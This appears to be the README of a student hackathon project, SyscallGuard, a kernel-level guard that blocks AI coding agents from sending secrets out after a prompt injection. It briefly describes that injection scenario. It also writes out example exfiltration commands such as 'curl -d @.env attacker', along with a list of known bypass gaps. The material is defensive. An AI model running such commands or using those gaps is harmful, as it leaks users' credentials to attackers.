# SyscallGuard

A Linux kernel-level data-exfiltration guard. Built for INNOTECH26 (KIET tech fest), Category 08: CyberShield.

## What it is

AI coding agents read project files, including the `.env` file holding passwords and API keys, so they can do their job. A hidden instruction in a README or webpage (**prompt injection**) can make the agent send those secrets to an attacker. Nothing in the operating system stops a program that can read a file from sending it out.

SyscallGuard puts the check inside the Linux kernel. Any process that opens a protected file gets **tagged**. A tagged process, and any child process it starts, may only connect to **allowlisted** destinations. Anything else is refused by the kernel before a single byte leaves. A live dashboard shows each tag, each allowed connection and each block.

**The rule:**

> A process that read a protected file may only connect to destinations on the allowlist. Everything else is blocked in the kernel.

This is deliberately **not** "no network at all." The agent keeps working with approved destinations (internal API, local services).

## Demo topology

```
 HOST LAPTOP (Fedora)                         VM (Fedora, BPF LSM)  ← the protected server
 ┌──────────────────────────┐                ┌─────────────────────────────────────────┐
 │ Electron dashboard ──────┼── ws:8765 ───▶ │ bridge.py  ◀── stdin ── guard.py (root) │
 │ attacker.py :9999 ◀──────┼── ✖ blocked ── │ agent.py ──▶ internal_api.py :8080 (ok) │
 │ terminal (ssh into VM)   │                │ kernel: hooks A–E + maps + ring buffer  │
 └──────────────────────────┘                └─────────────────────────────────────────┘
        attacker reachable from the VM at the libvirt gateway (usually 192.168.122.1)
```

The attacker runs on the host because loopback is allowlisted. An attacker on `localhost` would not be blocked.

## Prerequisites

In the VM (the protected machine):

- Fedora VM with BPF LSM active (`/sys/kernel/security/lsm` contains `bpf`)
- `kernel-devel` matching `uname -r`
- `bcc` and `python3-bcc`
- Python 3.11+ (for `tomllib`)
- `websockets` Python package

On the machine running the dashboard:

- Node.js + npm

## Quick start

Inside the VM, from the repo root:

```bash
# 1. Check the environment
scripts/check_env.sh

# 2. Prove BPF LSM programs load
sudo python3 scripts/lsm_smoke_test.py

# 3. Start the guard in audit mode and pipe it into the bridge
cp policy/policy.example.toml policy/policy.toml   # edit the protect path to match your checkout
sudo python3 guard/guard.py -p policy/policy.toml --mode audit | python3 bridge/bridge.py --host 0.0.0.0 --port 8765
```

On the host:

```bash
# 4. Start the dashboard pointing at the bridge
cd dashboard && npm install
SG_BRIDGE_URL=ws://<vm-ip>:8765 npm start

# Attacker listener (in another terminal)
python3 demo/attacker.py --port 9999
```

Back in the VM:

```bash
# 5. Run the demo agent
python3 demo/internal_api.py --port 8080 &
python3 demo/agent.py --mode direct --env demo/project/.env --attacker 192.168.122.1 \
    --port 9999 --api http://127.0.0.1:8080
```

Firewall ports: on the host, `sudo firewall-cmd --zone=libvirt --add-port=9999/tcp --add-port=9999/udp`; in the VM, `sudo firewall-cmd --add-port=8765/tcp`.

### Dashboard-only quick start (no VM needed)

```bash
python3 bridge/bridge.py --fake --port 8765
cd dashboard && npm install && npm start
```

## Safety

- Run `--mode enforce` **only inside the VM**. Never on your own laptop.
- The default mode is `audit`: it logs `WOULD_BLOCK` and blocks nothing.
- Stopping the guard (Ctrl-C, or killing `guard.py`) detaches every hook instantly.

## What it blocks

| Attempt | Mechanism |
|---|---|
| Tagged process connects to a non-allowlisted IP | Hook B |
| `curl -d @.env attacker` (curl opens the file itself) | Hook A tags curl, then Hook B |
| Tagged process spawns `curl` / `nc` / `python` carrying the data | Hook D inheritance, then Hook B/C |
| Base64 / any encoding | Content is never inspected; the process is tagged |
| Any port | Allowlist is by address |
| IPv6 and IPv4-mapped IPv6 | Hooks B/C handle it; not tested on the demo VM (no v6 route); IPv4-mapped IPv6 is tested |
| UDP `sendto()` | Hook C. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet) |
| Socket connected *before* reading the secret, then `send()` | Hook C checks the connected peer. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet) |

## What it does not block (known gaps)

- Sibling pipelines: `cat .env | curl -d @- attacker`
- Writing the secret to a file that another, untagged process sends later
- Exfil to an allowlisted destination
- DNS tunnelling through the allowed local resolver
- `AF_UNIX` / local IPC relays
- `ptrace` into untagged processes
- Root attackers
- A process whose thread-group leader exits while worker threads keep running (tag removed early)

## Team tracks

- **K**: Kernel enforcement
- **G**: Guard runtime & bridge
- **D**: Demo kit & verification
- **U**: Dashboard
- **P**: Presentation

## Who works where

New here, human or AI agent? Start with [AGENTS.md](AGENTS.md). It is the entry point and links to everything else.

| Person | Track | Owns | Person file(s) |
|---|---|---|---|
| Azaan | K — kernel enforcement | guard/bpf/ | [guard/docs/azaan.md](guard/docs/azaan.md) |
| Hifza | G1 — guard core | guard/guard.py, guard/policy.py, tests/test_policy.py | [guard/docs/hifza.md](guard/docs/hifza.md), [policy/docs/hifza.md](policy/docs/hifza.md) |
| Divyanshu | G2 — events and bridge | guard/events.py, bridge/, tests/test_events.py | [guard/docs/divyanshu.md](guard/docs/divyanshu.md), [bridge/docs/divyanshu.md](bridge/docs/divyanshu.md) |
| Devansh | U — dashboard | dashboard/ | [dashboard/docs/devansh.md](dashboard/docs/devansh.md) |
| Suyash | D — demo and verification; P — presentation | demo/, scripts/, tests/ (except test_policy.py, test_events.py), docs/presentation/ | [demo/docs/suyash.md](demo/docs/suyash.md), [policy/docs/suyash.md](policy/docs/suyash.md) |

`policy/` has no single owner: Hifza owns the schema and validation, Suyash owns keeping the example file correct for the VM. Track P (presentation) is Suyash's second hat: five people, five tracks, and the runbook is already his. Reassign P if someone is genuinely free. Cross-track changes are logged in [docs/shared.md](docs/shared.md).

## More

- [docs/PRD.md](docs/PRD.md): product document
- [ARCHITECTURE.md](ARCHITECTURE.md): components, contracts, decision logic
- [AGENTS.md](AGENTS.md): rules for developers and AI coding tools
- [docs/PROJECT_BRIEF.md](docs/PROJECT_BRIEF.md): full design brief (wins over the PRD where they disagree)
